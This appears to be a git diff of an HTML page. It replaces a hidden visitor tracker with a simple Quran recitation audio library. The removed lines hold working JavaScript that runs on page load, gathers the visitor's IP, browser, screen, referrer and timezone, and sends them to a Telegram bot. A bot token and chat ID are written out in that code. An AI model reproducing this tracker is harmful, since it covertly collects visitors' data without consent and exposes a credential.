@@ -1,47 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User Tracking</title>
-    <script>
-        function trackUser() {
-            // IP Address Fetch (Using IPify API)
-            let ip_api = "https://api64.ipify.org?format=json";
-
-            fetch(ip_api)
-                .then(response => response.json())
-                .then(data => {
-                    let userIP = data.ip;
-                    let userAgent = navigator.userAgent; // Browser details
-                    let screenSize = `${screen.width}x${screen.height}`; // Screen Resolution
-                    let referrer = document.referrer || "Direct Visit"; // Referrer URL
-                    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Timezone
-                    
-                    // Construct message for Telegram
-                    let message = `New Visitor Detected! 
-                    \nIP: ${userIP} 
-                    \nUser-Agent: ${userAgent} 
-                    \nScreen: ${screenSize} 
-                    \nReferrer: ${referrer} 
-                    \nTimezone: ${timezone}`;
-
-                    // Telegram Bot URL (Replace with your Bot's API Token and Chat ID)
-                    let tg_url = `https://api.telegram.org/bot7541518107:AAHKDYJ7w_KMe2In8ozJjtLET8IuW9jKtyY/sendMessage?chat_id=8094522569&text=${encodeURIComponent(message)}`;
-
-                    // Send the message to Telegram
-                    fetch(tg_url)
-                        .then(response => response.json())
-                        .then(data => console.log("Data sent to Telegram:", data))
-                        .catch(error => console.error("Error sending data to Telegram:", error));
-                });
-        }
-
-        // Trigger tracking function on page load
-        window.onload = trackUser;
-    </script>
+  <meta charset="UTF-8">
+  <title>Quraan Audio Library</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+      background: #f5f5f5;
+    }
+    .audio-box {
+      background: white;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 15px;
+      margin-bottom: 15px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+    .audio-title {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    audio {
+      width: 100%;
+      outline: none;
+    }
+  </style>
 </head>
 <body>
-    <h2>Tracking User Information...</h2>
+
+  <h2>Quraan Lehja Recordings</h2>
+  <div id="audio-container"></div>
+
+  <script>
+    // Yeh array manually tu bana
+    const a = "Qari Israafeel Misbahi"
+    const b = "Hafiz Luqmaan"
+    const recordings = [
+      { file: "Q_SurahFatiha_Maya.aac", reader: a , lehja: "Maya", surah: "Al-Fatiha" },
+      { file: "surah-alQiyamah full.mp3", reader: b , lehja: "kurd", surah: "Al-Qiyaamah" },
+      // aur bhi add kar sakta hai
+    ];
+
+  
+    const container = document.getElementById('audio-container');
+
+    recordings.forEach(rec => {
+      const box = document.createElement('div');
+      box.className = 'audio-box';
+      box.innerHTML = `
+        <div class="audio-title">${rec.surah} (${rec.lehja}) - ${rec.reader}</div>
+        <audio controls src="${rec.file}"></audio>
+        <br>
+        <a href="${rec.file}" download>Download</a>
+      `;
+      container.appendChild(box);
+    });
+  </script>
+
 </body>
 </html>
